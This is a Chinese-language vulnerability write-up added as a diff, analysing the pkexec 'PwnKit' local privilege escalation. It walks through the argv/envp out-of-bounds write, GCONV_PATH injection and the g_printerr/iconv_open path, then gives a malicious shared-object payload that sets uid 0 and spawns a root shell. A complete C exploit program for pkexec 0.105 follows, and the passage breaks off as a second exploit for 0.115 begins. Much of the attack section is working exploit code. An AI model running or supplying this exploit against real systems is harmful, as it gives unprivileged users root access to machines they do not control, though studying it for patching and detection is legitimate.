@@ -1,0 +1,105 @@
+# 漏洞分析
+这个漏洞比较nb，现有的所有版本的pkexec都受到影响  
+polkit是一个授权管理器，其系统架构由授权和身份验证代理组成，pkexec是其中polkit的其中一个工具，他的作用有点类似于sudo，允许用户以另一个用户身份执行命令
+## 漏洞原理
+来直接看源码吧  
+挑了个0.120版本的，直接看main函数即可  
+源码链接：  
+首先看到534行，这里main函数进来以后，先要对运行pkexec的参数进行处理，n=1被初始化赋值
+但如果直接运行pkexec，没有加任何参数，这里的n也就一直为1了  
+接着到610行，此时argv[1]
+实际上是越界了的，因为没有输入参数，而根据栈的布局，main函数输入的参数argv和envp是挨在一起的，这个稍微有一点二进制调试经验的人都知道
+也就是说此时的argv[1]指向的是envp[0]  
+因此 path 会被赋值为envp[0]  
+接着来到632行，s = g_find_program_in_path (path)，会通过PATH环境变量找到该程序的绝对路径并返回  
+最后触发数组下标越界写的地方在639行  
+此时argv[1]被赋值为 一个绝对地址，也就是 envp[0]被赋值为一个绝对地址  
+通过上面的分析可以发现，如果攻击者执行pkexec时，指定了恶意的envp[0]，那么可以写入一个环境变量到目标进程空间中
+然后我们需要找到一个可以利用的环境变量，然后有这种方法给他写进去，这种环境变量是可以导致外部引入so并且执行其中的函数，这个变量就是GCONV_PATH
+## 利用思考
+**那么一个问题来了，我们利用的关键无非就是引入一个危险的环境变量，从而导入恶意so执行罢了，为什么要这么麻烦用这个漏洞呢？**  
+我直接调用 execve("pkexec", a_argv, a_envp);，在a_envp中指定GCONV_PATH不就完事了吗？  
+linux 的动态连接器ld-linux-x86-64.so.2
+会在特权程序执行的时候清除敏感环境变量，除了GCONV_PATH以外，也有其他环境变量可以直接引入外部so，如LD_PRELOAD ，所以这种方法是没用的
+（不信写exp试试）
+具体可以看glibc源码glibc-2.27/elf/dl-support.c 的_dl_non_dynamic_init函数中：  
+上述代码会把危险环境变量列表UNSECURE_ENVVARS里面的每一个环境变量给删除掉  
+定义在 
+可以看到，GCONV_PATH就在其中，这些环境变量都能有动态加载路径的能力，因此需要防止低权限用户通过这些环境变量利用suid程序造成提权
+## 劫持执行流
+**那么引入了GCONV_PATH变量，如何劫持执行流的？**
+在源码中引用了很多次g_printerr函数，用于输出错误信息  
+该函数是调用GLib的函数。但是如果环境变量CHARSET不是UTF-8，g_printerr()将会调用glibc的函数iconv_open()，来将消息从UTF-8转换为另一种格式。
+iconv_open函数的执行过程为：iconv_open函数首先会找到系统提供的gconv-modules配置文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置，之后会调用.so文件中的gconv()与gonv_init()函数。
+**因此如果我们改变了系统的GCONV_PATH环境变量，也就能改变gconv-modules配置文件的位置，从而执行一个恶意的so文件实现任意命令执行。**
+**最后一个问题就是 如何触发调用g_printerr函数了，我看了很多exp，主要有2种方式：**
+1.构造错误的XAUTHORITY环境变量，触发的函数调用路径为：  
+main -》validate_environment_variable
+这个函数是用来检查现有的环境变量是否合法的
+所以你可以看到，当你构造一个 XAUTHORITY变量，并且内容包含 “..”即可触发g_printerr函数  
+同理，第二种方法就是构造一个 错误的SHELL变量，就会触发g_printerr函数
+# 利用过程
+**1\. 伪造环境变量所指的目录文件结构**  
+先创建一个名为 GCONV_PATH=. 的目录，然后在这个目录中创建一个 GCONV_PATH=./pwnkit 文件  
+在创建一个目录pwnkit用于存放恶意的so，然后再创建一个文件 pwnkit/gconv-modules其内容为：  
+module UTF-8// PWNKIT// pwnkit 1  
+这里有个链接：  
+简单讲了module配置文件的写法，简单来说，以上面为例子，意思是从utf-8编码转换成PWNKIT编码，转换所需的资源在pwnkit.so中，消耗cost值为1，这就会让该转换具有更高的优先级
+**2\. 构造恶意so**  
+在pwnkit目录下编译一个so，其代码为：
+    #include 
+    #include 
+    #include 
+    void gconv() {}
+    void gconv_init() {
+                   setuid(0); setgid(0);
+                   seteuid(0); setegid(0);
+                   system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
+                   exit(0);
+    }
+编译一下  
+gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC
+**3\. execve调用pkexec并带入恶意envp数据**  
+设置的环境变量有：
+    char *env[] = { "pwnkit",  #触发越界写漏洞，最终使得写入环境变量：GCONV_PATH=./pwnkit
+    "PATH=GCONV_PATH=.",  #使得g_find_program_in_path查找pwnkit时会在GCONV_PATH=.目录中找到pwnkit
+    "CHARSET=PWNKIT",   #触发g_printerr更换编码字符，从而调用so中的恶意代码
+    "SHELL=pwnkit",   #触发调用g_printerr函数
+    NULL };
+有些exp中是没有"SHELL=pwnkit"，取而代之的是"XAUTHORITY=../xxx"，都差不多，都是为了触发调用g_printerr函数
+有些exp中也没有 "CHARSET=PWNKIT"，而是 "LC_MESSAGES=en_US.UTF-8"，作用都类似  
+设置完这些环境变量后就调用pkexec  
+execve("./pkexec_105", (char*[]){NULL}, env);
+# exp1
+复现环境为
+Ubuntu1604，pkexec版本为0.105，源码参考：
+    #include 
+    #include 
+    #include 
+    char *shell =
+            "#include \n"
+            "#include \n"
+            "#include \n\n"
+            "void gconv() {}\n"
+            "void gconv_init() {\n"
+            "       setuid(0); setgid(0);\n"
+            "       seteuid(0); setegid(0);\n"
+            "       system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; /bin/sh\");\n"
+            "       exit(0);\n"
+            "}";
+    int main(int argc, char *argv[]) {
+            FILE *fp;
+            system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
+            system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 1' > pwnkit/gconv-modules");
+            fp = fopen("pwnkit/pwnkit.c", "w");
+            fprintf(fp, "%s", shell);
+            fclose(fp);
+            system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
+            char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
+            execve("./pkexec_105", (char*[]){NULL}, env);
+    }
+运行截图：
+# exp2
+复现环境仍然是Ubuntu1604，不过选用0.115版本的pkexec进行漏洞复现，源码参考：  
+我们边整一个0.115的版本，可以用centos的docker下载后拖出来，也可以去这里下载rpm包  
+0.114+的版本中，在main函数里面多加了一句setenv
